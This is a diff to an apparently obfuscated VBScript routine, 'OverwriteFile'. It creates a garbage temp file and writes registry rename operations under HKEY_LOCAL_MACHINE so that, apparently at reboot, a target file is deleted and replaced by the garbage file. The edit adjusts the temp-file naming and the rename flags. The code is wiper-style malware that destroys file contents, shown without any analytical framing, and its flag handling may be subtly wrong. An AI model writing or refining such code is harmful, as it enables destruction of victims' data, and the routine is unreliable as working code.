@@ -34,9 +34,7 @@ Sub OverwriteFile(filePath)
     If q3z8k.FileExists(filePath) Then
         ' Generate clean GUID filename
         Dim typeLib, guid, tempFile
-        Set typeLib = CreateObject("Scriptlet.TypeLib")
-        guid = Replace(Replace(typeLib.GUID, "{", ""), "}", "")
-        tempFile = "C:\Temp\garbage_" & guid & ".tmp"
+        tempFile = "C:\Temp\" & q3z8k.GetTempName()
         
         ' Create garbage file
         Set y8h2m = q3z8k.CreateTextFile(tempFile, True, True)
@@ -55,15 +53,15 @@ Sub OverwriteFile(filePath)
         errCode = oReg.GetMultiStringValue(HKEY_LOCAL_MACHINE, keyPath, valueName, existingOps)
         If errCode <> 0 Then existingOps = Array()
         
-        ' Add DELETE operation for original file
+        ' STEP 1: Delete original file
         ReDim Preserve existingOps(UBound(existingOps) + 2)
         existingOps(UBound(existingOps)-1) = "\??\" & filePath & "!"  ' Mark for deletion
-        existingOps(UBound(existingOps)) = ""                          ' Empty destination
+        existingOps(UBound(existingOps)) = ""                          ' EMPTY destination (critical)
         
-        ' Add MOVE operation for replacement
+        ' STEP 2: Move replacement into place
         ReDim Preserve existingOps(UBound(existingOps) + 2)
-        existingOps(UBound(existingOps)-1) = "\??\" & tempFile        ' Source temp file
-        existingOps(UBound(existingOps)) = "\??\" & filePath & "!"    ' Destination with replace flag
+        existingOps(UBound(existingOps)-1) = "\??\" & tempFile & "!"  ' Source with move flag
+        existingOps(UBound(existingOps)) = "\??\" & filePath           ' Destination (no !)
         
         ' Write to registry
         oReg.SetMultiStringValue HKEY_LOCAL_MACHINE, keyPath, valueName, existingOps
